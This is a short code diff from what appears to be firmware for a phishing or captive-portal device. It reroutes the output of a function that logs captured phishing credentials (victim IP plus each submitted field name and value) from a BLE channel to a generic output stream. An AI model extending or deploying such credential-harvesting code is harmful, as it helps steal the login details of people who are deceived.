@@ -20,7 +20,7 @@
 #include "http_server.h"
 #include "radio_common.h"
 #include "rgb_led.h"
-#include "ble_cli.h"
+#include "out_stream.h"
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -320,10 +320,10 @@ static void cred_add(const char *ip, const char *body)
         char buf[192];
         snprintf(buf, sizeof(buf), "META,PHISH,CRED,id,%d,ip,%s,fields,%d",
                  s_cred_cnt, c->ip, c->n);
-        ble_event_post(buf);
+        out_raw(buf);
         for (int i = 0; i < c->n; i++) {
             snprintf(buf, sizeof(buf), "CRED,%d,%s,%s", s_cred_cnt, c->key[i], c->val[i]);
-            ble_event_post(buf);
+            out_raw(buf);
         }
     }
     /* 串口侧保留同样的内容, 方便有线调试 */
